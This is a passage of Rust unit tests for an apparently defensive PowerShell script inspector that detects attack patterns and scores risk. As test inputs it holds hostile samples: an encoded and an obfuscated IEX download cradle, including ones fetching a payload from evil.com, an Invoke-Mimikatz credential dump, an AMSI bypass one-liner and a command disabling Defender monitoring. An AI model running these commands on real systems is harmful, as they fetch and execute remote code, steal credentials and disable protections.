        let script = r#"powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGMAbwBtAC8AcwBjAHIAaQBwAHQAJwApAA=="#;
        let matches = ScriptInspector::detect_encoding(script);
        assert!(!matches.is_empty());
        assert!(matches.iter().any(|m| m.rule_name == "encoded_command"));
    }

    #[test]
    fn test_detect_download_cradle() {
        let script =
            r#"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"#;
        let matches = ScriptInspector::detect_download_cradles(script);
        assert!(!matches.is_empty());
    }

    #[test]
    fn test_detect_mimikatz() {
        let script = r#"Invoke-Mimikatz -DumpCreds"#;
        let matches = ScriptInspector::detect_attack_tools(script);
        assert!(!matches.is_empty());
        assert!(matches.iter().any(|m| m.rule_name == "mimikatz"));
    }

    #[test]
    fn test_detect_amsi_bypass() {
        let script = r#"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"#;
        let matches = ScriptInspector::detect_amsi_bypass(script);
        assert!(!matches.is_empty());
    }

    #[test]
    fn test_detect_defender_evasion() {
        let script = r#"Set-MpPreference -DisableRealtimeMonitoring $true"#;
        let matches = ScriptInspector::detect_defender_evasion(script);
        assert!(!matches.is_empty());
    }

    #[test]
    fn test_detect_obfuscation() {
        let script =
            r#"$a = 'i'+'e'+'x'; &$a (New-Object Net.WebClient).DownloadString('http://evil.com')"#;
        let matches = ScriptInspector::detect_obfuscation(script, &ScriptType::PowerShell);
        assert!(!matches.is_empty());
    }

    #[test]
    fn test_risk_score_calculation() {
        let matches = vec![
            ScriptMatch {
                rule_name: "mimikatz".to_string(),
                category: MatchCategory::AttackTool,
                description: "Mimikatz detected".to_string(),
                confidence: 0.98,
                matched_content: "invoke-mimikatz".to_string(),
                mitre_tactics: vec!["Credential Access".to_string()],
                mitre_techniques: vec!["T1003".to_string()],
            },
            ScriptMatch {
                rule_name: "amsi_bypass".to_string(),
                category: MatchCategory::AmsiBypass,
                description: "AMSI bypass".to_string(),
                confidence: 0.95,
                matched_content: "amsiutils".to_string(),
                mitre_tactics: vec!["Defense Evasion".to_string()],
                mitre_techniques: vec!["T1562.001".to_string()],
            },
        ];

        let score = ScriptInspector::calculate_risk_score(&matches);
        assert!(score > 0.5);
    }
}
